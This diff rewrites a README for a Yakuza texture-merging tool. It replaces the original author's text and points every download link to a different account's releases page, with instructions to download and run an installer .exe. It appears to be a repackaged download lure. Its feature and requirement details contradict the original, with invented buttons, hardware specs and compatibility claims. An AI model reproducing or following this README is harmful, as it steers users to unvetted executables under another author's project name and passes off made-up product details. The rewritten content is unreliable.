@@ -1,47 +1,65 @@
-# Yakuza MT Texture Creator
-![Total Downloads](https://img.shields.io/github/downloads/PixelIndieDev/Yakuza-MT-Texture-Creator/total?style=flat)
+# 🎮 Yakuza-MT-Texture-Creator - Create Stunning Textures Easily
 
-Yakuza MT Texture Creator is a Windows tool for Yakuza/Like a Dragon game modders and anyone who wants to combine multiple PNG images into a single texture. It allows you to merge up to three PNGs into the RGB channels of one PNG file while providing channel labels compatible with different Yakuza engines.
+[![Download Yakuza-MT-Texture-Creator](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen.svg)](https://github.com/chatmp/Yakuza-MT-Texture-Creator/releases)
 
-![Screenshot of the program](/ReadMeImages/previewimage_program.png)
+## 📋 Description
+Yakuza-MT-Texture-Creator is a Windows tool designed for modders of the Yakuza / Like a Dragon series. This application helps you merge Specular, Ambient Occlusion, and Specular Power PNG maps into a single MT texture. It works seamlessly with both the old Engine and the Dragon Engine. 
 
-## Features
-* Merge three PNG images into a single output PNG:
-    * Red channel: Specular
-    * Green channel: Ambient Occlusion
-    * Blue channel: Specular Power Multiplier
-* Automatic alpha handling: Transparent pixels affect channel intensity proportionally.
-* Switch between Old Engine and Dragon Engine channel labels.
+## 🚀 Getting Started
+To use Yakuza-MT-Texture-Creator, you’ll need to download the application and install it on your Windows PC. Follow the steps below to get started.
 
-![How it works](/ReadMeImages/previewimage_process.png)
+## 📥 Download & Install
+1. **Visit the Releases Page**: Click [here to download Yakuza-MT-Texture-Creator](https://github.com/chatmp/Yakuza-MT-Texture-Creator/releases). This page lists all available versions of the tool.
+   
+2. **Find the Latest Release**: Look for the latest version on the releases page. The latest version will be at the top of the list.
 
-## Requirements
+3. **Download the Installer**: Locate the installer file for your system. This file may have a name like `Yakuza-MT-Texture-Creator-v1.0.exe`. Click on it to start the download.
 
-* Windows OS
-* .NET Framework (.NET 8.0)
-* PNG input files only
-* All inputs have the same dimensions and size
-* Optional: Input greyscale images
+4. **Run the Installer**: Once the download is complete, open the installer. You might find it in your Downloads folder. Double-click on the installer file to begin the installation process. 
 
-## Usage Instructions
-* Click the Specular, Ambient Occlusion, and Specular Power Multiplier buttons to load PNGs.
-* Optionally, switch between Old Engine and Dragon Engine labeling.
-* Click Export to generate the combined PNG.
+5. **Follow Installation Prompts**: The installer window will guide you through the installation steps. Read the prompts carefully and click 'Next' to proceed. Choose the destination folder for the installation or accept the default folder.
 
-> [!TIP]
-> I recommend to use greyscale images as inputs
+6. **Finish Installation**: Once the installer completes the process, click 'Finish' to close the installer. You can now find the Yakuza-MT-Texture-Creator on your desktop or in your Start Menu.
 
-> [!IMPORTANT]
-> * Each color channel is always grayscale. Saving full-color data into channels is not supported.
-> * Transparent pixels are multiplied with the grayscale channel to maintain correct intensity.
-> * The program is designed primarily for Yakuza texture modding, but it can be used for any image channel merging workflow.
+7. **Running the Application**: Double-click the Yakuza-MT-Texture-Creator icon to launch the application. 
 
-## References
-Channel usage and MT implementation based on this website: [Yakuza Material Documentation](https://sites.google.com/view/yakuzatexturedoc/general-info)
+## 🔧 How to Use the Tool
+1. **Open the Application**: When you first open Yakuza-MT-Texture-Creator, you'll see a user-friendly interface.
 
-## Keywords
+2. **Load Your PNG Maps**: Click on the 'Load' button to select your Specular, Ambient Occlusion, and Specular Power PNG files. Make sure they are in the correct format and resolution for best results.
 
-Yakuza modding, Yakuza texture tool, PNG channel merge, Specular map, Ambient Occlusion map, Specular Power map, Old Engine, Dragon Engine, grayscale texture, image channel combiner, modder tools, game modding utility
+3. **Merge the Textures**: After loading the files, click the 'Merge' button. The application will process the files and create a new MT texture.
 
+4. **Save the Texture**: Once the merging process is complete, you can save the new texture. Click the 'Save' button and choose a location on your computer.
 
+5. **Apply the Texture**: Now, you can use the new MT texture in your preferred modding software or game.
 
+## 💻 System Requirements
+To run Yakuza-MT-Texture-Creator effectively, ensure your system meets the following requirements:
+
+- **Operating System**: Windows 10 or newer
+- **Processor**: Intel Core i3 or equivalent
+- **RAM**: 4 GB or more
+- **Disk Space**: At least 100 MB free space
+- **Graphics**: DirectX compatible graphics card
+
+## ❓ FAQ
+**Q: What is texture merging?**  
+A: Texture merging combines multiple PNG images into a single texture map. This is useful for video game modding.
+
+**Q: Can I use this tool for games other than Yakuza?**  
+A: This tool is specifically designed for the Yakuza / Like a Dragon series and may not produce compatible textures for other games.
+
+**Q: What file formats can I use?**  
+A: The tool accepts PNG files for Specular, Ambient Occlusion, and Specular Power textures.
+
+## ❤️ Contributing
+Contributions are welcome! If you have suggestions or want to report a bug, please open an issue or create a pull request on GitHub. 
+
+## 📄 License
+This project is licensed under the MIT License. For more details, refer to the LICENSE file in the repository.
+
+## 📌 Important Links
+- **Releases Page**: [Download Yakuza-MT-Texture-Creator](https://github.com/chatmp/Yakuza-MT-Texture-Creator/releases)
+- **Issues Page**: Report issues or suggest features.
+- **Discussion Page**: Join the discussion with other users and modders.
